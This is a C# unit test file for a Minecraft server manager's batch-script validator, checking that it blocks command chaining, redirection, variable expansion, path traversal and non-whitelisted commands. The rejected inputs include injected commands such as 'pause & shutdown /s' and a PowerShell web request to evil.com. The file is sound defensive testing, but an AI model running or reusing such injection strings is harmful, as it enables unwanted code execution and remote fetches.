using MinecraftServerManager.Infrastructure.Servers;
using Xunit;

namespace MinecraftServerManager.UnitTests;

public sealed class SafeScriptValidatorTests
{
    [Theory]
    [InlineData("@echo off & calc.exe")]
    [InlineData("echo off | evil.exe")]
    [InlineData("rem comment > evil.bat")]
    [InlineData("title safe < evil.txt")]
    [InlineData("@echo off ^& calc.exe")]
    [InlineData("pause & shutdown /s")]
    [InlineData("chcp 65001 & notepad")]
    public void RejectsCommandChainingAndRedirectionEvenWithSafePrefix(string maliciousLine)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, maliciousLine);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Theory]
    [InlineData("echo !PATH!")]
    [InlineData("java %COMSPEC%")]
    [InlineData("java -jar %USERPROFILE%\\server.jar")]
    public void RejectsUnsafeVariableExpansion(string unsafeLine)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, unsafeLine);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsPathTraversalInScript()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, "java @..\\outside.txt\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsNonWhitelistedCommands()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, "powershell -Command Invoke-WebRequest http://evil.com\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void AcceptsValidForgeAndNeoForgeLaunchScripts()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            string validContent = """
                REM Forge server start script
                @echo off
                chcp 65001
                cd /d "%~dp0"
                java @user_jvm_args.txt @libraries/net/minecraftforge/forge/1.20.1/win_args.txt %*
                pause
                """;
            File.WriteAllText(script, validContent);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.True(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsScriptOutsideServerDirectory()
    {
        string dir = CreateTempDirectory();
        string outsideDir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(outsideDir, "outside.bat");
            File.WriteAllText(script, "@echo off\r\njava -jar server.jar\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
            Directory.Delete(outsideDir, recursive: true);
        }
    }

    private static string CreateTempDirectory()
    {
        string path = Path.Combine(Path.GetTempPath(), "msm-test-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }
}
